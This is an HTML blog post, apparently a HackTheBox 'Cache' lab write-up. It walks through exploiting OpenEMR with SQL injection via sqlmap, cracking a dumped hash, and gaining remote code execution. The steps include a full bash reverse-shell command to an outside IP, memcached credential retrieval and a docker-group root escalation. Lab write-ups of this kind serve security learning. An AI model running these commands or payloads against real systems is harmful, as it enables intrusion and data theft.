@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>Cache Writeup [HTB]</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Cache Writeup [HTB] | 5ubterranean’s Blog</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="Cache Writeup [HTB]" />
+<meta name="author" content="5ubterranean" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Cache is a Linux based machine that was active since May 9th of 2020 to October 10th, we will start the machine checking the webpage, there we will find a subdomain, on that subdomain we will find an instance of openEMR vulnerable to SQL Injection and RCE, once inside the machine we will find a memcached server inside the machine, enumerating memcached we will find the password of another user, this user belongs to docker group, so we will start a docker image mapping the whole system to root the machine." />
+<meta property="og:description" content="Cache is a Linux based machine that was active since May 9th of 2020 to October 10th, we will start the machine checking the webpage, there we will find a subdomain, on that subdomain we will find an instance of openEMR vulnerable to SQL Injection and RCE, once inside the machine we will find a memcached server inside the machine, enumerating memcached we will find the password of another user, this user belongs to docker group, so we will start a docker image mapping the whole system to root the machine." />
+<link rel="canonical" href="http://localhost:8000/Cache" />
+<meta property="og:url" content="http://localhost:8000/Cache" />
+<meta property="og:site_name" content="5ubterranean’s Blog" />
+<meta property="og:image" content="http://localhost:8000/assets/images/cache/cache.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-10-10T00:00:00-05:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:8000/assets/images/cache/cache.png" />
+<meta property="twitter:title" content="Cache Writeup [HTB]" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"5ubterranean","url":"https://5ubterranean.github.io"},"dateModified":"2020-10-10T00:00:00-05:00","datePublished":"2020-10-10T00:00:00-05:00","description":"Cache is a Linux based machine that was active since May 9th of 2020 to October 10th, we will start the machine checking the webpage, there we will find a subdomain, on that subdomain we will find an instance of openEMR vulnerable to SQL Injection and RCE, once inside the machine we will find a memcached server inside the machine, enumerating memcached we will find the password of another user, this user belongs to docker group, so we will start a docker image mapping the whole system to root the machine.","headline":"Cache Writeup [HTB]","image":"http://localhost:8000/assets/images/cache/cache.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:8000/Cache"},"url":"http://localhost:8000/Cache"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>5ubterranean@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/tags.html"><h2 class="header-link">Tags</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  
+  <img src=/assets/images/cache/cache.png/../banner.png>
+  
+  <h2>Cache Writeup [HTB]</h2>
+  <time datetime="2020-10-10T00:00:00-05:00" class="by-line">10 Oct 2020</time>
+  <p>Cache is a Linux based machine that was active since May 9th of 2020 to October 10th, we will start the machine checking the webpage, there we will find a subdomain, on that subdomain we will find an instance of openEMR vulnerable to SQL Injection and RCE, once inside the machine we will find a memcached server inside the machine, enumerating memcached we will find the password of another user, this user belongs to docker group, so we will start a docker image mapping the whole system to root the machine.</p>
+
+<h1 id="enumeration"><a href="#header-1"></a>Enumeration</h1>
+
+<p>We start using masscan to find all the available ports and then use nmap to get more information about them.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>masscan -e tun0 --rate=500 -p 0-65535 10.10.10.188
+nmap -sC -sV -p 80,22, -Pn -o scan.txt 10.10.10.188
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 (RSA)
+|   256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 (ECDSA)
+|_  256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Cache
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<p>There is only SSH and a webpage available, so let’s check the webpage, we land on a kind of blog.</p>
+
+<p><img src="/assets/images/cache/webpage.png" alt="" /></p>
+
+<p>We start by looking at “login”, there we see a login form.</p>
+
+<p><img src="/assets/images/cache/login.png" alt="" /></p>
+
+<p>But it doesn’t do anything, it’s more if we check it with burp we see a js file with the expected credentials.</p>
+
+<p><img src="/assets/images/cache/creds.png" alt="" /></p>
+
+<p>We tried them on ssh but we got nothing, so we move forward and keep exploring the site, we get to http://10.10.10.188/author.html.</p>
+
+<p><img src="/assets/images/cache/author.png" alt="" /></p>
+
+<p>There we see a domain, “cache.htb”, but there is something else, there says “Check out his other projects like Cache: HMS(Hospital Management System)”, so we can guess that there is a domain called hms.htb, so we add them to our hosts file and visit the site. Once we go to hms.htb we see an openEMR instance.</p>
+
+<p><img src="/assets/images/cache/openemr.png" alt="" /></p>
+
+<h2 id="sql-injection"><a href="#header-2"></a>SQL Injection</h2>
+
+<p>Using findsploit we find a msf module to dump the whole database through SQL Injection, but the database of openEMR is huge, and dumping it would take a lot of time, also finding information among the dump would be hard, so let’s see if we can do something by ourselves. We read the source code of the exploit located at “/usr/share/metasploit-framework/modules/auxiliary/sqli/openemr/openemr_sqli_dump.rb”, while reading it we find the requests that is made on line 76.</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">def</span> <span class="nf">get_response</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">send_request_cgi</span><span class="p">(</span>
+      <span class="s1">'method'</span> <span class="o">=&gt;</span> <span class="s1">'GET'</span><span class="p">,</span>
+      <span class="s1">'uri'</span> <span class="o">=&gt;</span> <span class="n">normalize_uri</span><span class="p">(</span><span class="n">uri</span><span class="p">,</span> <span class="s1">'interface'</span><span class="p">,</span> <span class="s1">'forms'</span><span class="p">,</span> <span class="s1">'eye_mag'</span><span class="p">,</span> <span class="s1">'taskman.php'</span><span class="p">),</span>
+      <span class="s1">'vars_get'</span> <span class="o">=&gt;</span> <span class="p">{</span>
+        <span class="s1">'action'</span> <span class="o">=&gt;</span> <span class="s1">'make_task'</span><span class="p">,</span>
+        <span class="s1">'from_id'</span> <span class="o">=&gt;</span> <span class="s1">'1'</span><span class="p">,</span>
+        <span class="s1">'to_id'</span> <span class="o">=&gt;</span> <span class="s1">'1'</span><span class="p">,</span>
+        <span class="s1">'pid'</span> <span class="o">=&gt;</span> <span class="s1">'1'</span><span class="p">,</span>
+        <span class="s1">'doc_type'</span> <span class="o">=&gt;</span> <span class="s1">'1'</span><span class="p">,</span>
+        <span class="s1">'doc_id'</span> <span class="o">=&gt;</span> <span class="s1">'1'</span><span class="p">,</span>
+        <span class="s1">'enc'</span> <span class="o">=&gt;</span> <span class="s2">"1' and updatexml(1,concat(0x7e, (</span><span class="si">#{</span><span class="n">payload</span><span class="si">}</span><span class="s2">)),0) or '"</span>
+      <span class="p">}</span>
+    <span class="p">)</span>
+  <span class="k">end</span>
+</code></pre></div></div>
+
+<p>So we can see that the requests are made to “http://hms.htb/interface/forms/eye_mag/taskman.php?action=make_task&amp;from_id=1&amp;to_id=1&amp;pid=1&amp;doc_type=1&amp;doc_id=1&amp;enc=1”, and the vulnerable parameter is “enc”, so we feed that to sqlmap, also we see that the site isn’t as fast as we would like so we have to increase the timeout (note that this will make sqlmap a lot slower that usual): <code class="language-plaintext highlighter-rouge">sqlmap -u 'http://hms.htb/interface/forms/eye_mag/taskman.php?action=make_task&amp;from_id=1&amp;to_id=1&amp;pid=1&amp;doc_type=1&amp;doc_id=1&amp;enc=1' -p enc --dbs --timeout=60 --batch</code>.</p>
+
+<p><img src="/assets/images/cache/database.png" alt="" /></p>
+
+<p>After waiting for a long time we get the databases (from the msf exploit we could guess that the SQLI was performed using an error technique, but for some reason if we especify it sqlmap would take longer, anyways still takes more than an hour), so let’s retrieve the tables inside “openemr”, and since we got that the database was mysql let’s add that too, the same with the technique: <code class="language-plaintext highlighter-rouge">sqlmap -u 'http://hms.htb/interface/forms/eye_mag/taskman.php?action=make_task&amp;from_id=1&amp;to_id=1&amp;pid=1&amp;doc_type=1&amp;doc_id=1&amp;enc=1' -p enc --timeout=60 --batch --dbms=mysql -D openemr --tables --technique=E</code>.</p>
+
+<p><img src="/assets/images/cache/tables.png" alt="" /></p>
+
+<p>There are a lot of tables on the database, but the one that catches our attention is “users_secure”, so let’s dump it. <code class="language-plaintext highlighter-rouge">sqlmap -u 'http://hms.htb/interface/forms/eye_mag/taskman.php?action=make_task&amp;from_id=1&amp;to_id=1&amp;pid=1&amp;doc_type=1&amp;doc_id=1&amp;enc=1' -p enc --timeout=60 --batch --dbms=mysql -D openemr -T users_secure --dump --technique=E</code></p>
+
+<p><img src="/assets/images/cache/dump.png" alt="" /></p>
+
+<p>We see a hash, “$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.”, so we save it and crack it with john, we get that the password is “xxxxxx”.</p>
+
+<p><img src="/assets/images/cache/hash.png" alt="" /></p>
+
+<h1 id="gaining-access"><a href="#header-1"></a>Gaining Access</h1>
+
+<p>Searching for exploits we saw some RCE that required that we were authenticated, so now that we have credentials we can use them, so we will use <a href="https://www.exploit-db.com/exploits/45161">this one</a>, we save the exploit as “exp.py”, set up a listener on port 54321 and execute <code class="language-plaintext highlighter-rouge">./exp.py http://hms.htb -u openemr_admin -p xxxxxx -c "bash -i &gt;&amp; /dev/tcp/10.10.14.131/54321 0&gt;&amp;1"</code>, and with that we will get a shell on the machine.</p>
+
+<p><img src="/assets/images/cache/shell1.png" alt="" /></p>
+
+<h1 id="lateral-movement"><a href="#header-1"></a>Lateral Movement</h1>
+
+<p>There are two users on the machine, luffy and ash, we got the password of ash while exploring the website, so we try it.</p>
+
+<p><img src="/assets/images/cache/shell2.png" alt="" /></p>
+
+<p>With that we got “user.txt”.</p>
+
+<h1 id="lateral-movement-2"><a href="#header-1"></a>Lateral Movement 2</h1>
+
+<p>There was actually no need of performing the last step, but let’s continue, we see which ports are listenning locally, we see the mysql database and port 11211, which is the default port of memcached. If we were wrong we should have to make a port forwarding so we can reach that port and scan it with nmap, but we can test the port connecting to it with nc and trying some memcached commands, if we put “stats items” we see that there is only one slab id, 1, so we retrieve keys that are located there.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stats cachedump 1 100
+ITEM link [21 b; 0 s]
+ITEM user [5 b; 0 s]
+ITEM passwd [9 b; 0 s]
+ITEM file [7 b; 0 s]
+ITEM account [9 b; 0 s]
+END
+</code></pre></div></div>
+
+<p>Now we retrieve the values under user and passwd.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>get user
+VALUE user 0 5
+luffy
+END
+get passwd
+VALUE passwd 0 9
+0n3_p1ec3
+END
+</code></pre></div></div>
+
+<p>We got another password so we can now change to the user “luffy”.</p>
+
+<p><img src="/assets/images/cache/shell3.png" alt="" /></p>
+
+<h1 id="privilege-escalation"><a href="#header-1"></a>Privilege Escalation</h1>
+
+<p>We see that the user luffy belongs to “docker” group, so if there is docker image we can start it mapping the whole system on it, we check available images.</p>
+
+<p><img src="/assets/images/cache/dimages.png" alt="" /></p>
+
+<p>There is “ubuntu” image, so we can start it mapping the whole system to “mnt” and using chroot on that directory, <code class="language-plaintext highlighter-rouge">docker run -v /:/mnt --rm -it ubuntu chroot /mnt sh</code>, and with that we can get “root.txt”.</p>
+
+<p><img src="/assets/images/cache/root.png" alt="" /></p>
+
+<h1 id="final-note"><a href="#header-1"></a>Final Note</h1>
+
+<p>At the start of the exploit used there is a warning: “WARNING: This proof-of-concept exploit WILL replace the GLOBAL config. If you don’t want the OpenEMR config to be reset to default, please modify the payload.” There is a vulnerability report about openEMR, <a href="https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf">link</a>, where there are reported several RCE techniques changing global variables, there is a high probability that the web application breaks using this exploit so the best option on the real world would be editing it as the warnning suggets.</p>
+
+  <div class="tags">
+  <h3>Tags</h3>
+  
+  <a href="/tags.html#hackthebox"> HackTheBox</a> &nbsp;
+  
+  <a href="/tags.html#sql-injection"> SQL Injection</a> &nbsp;
+  
+  <a href="/tags.html#docker"> Docker</a> &nbsp;
+  
+  <br />
+  <br />
+  </div>
+  <script src="https://www.hackthebox.eu/badge/68440"></script>
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>5ubterranean</b>
+    </span>
+    
+    <span>© 2025</span>
+  </a>
+</footer>
+
+  
+</body>
+
+</html>
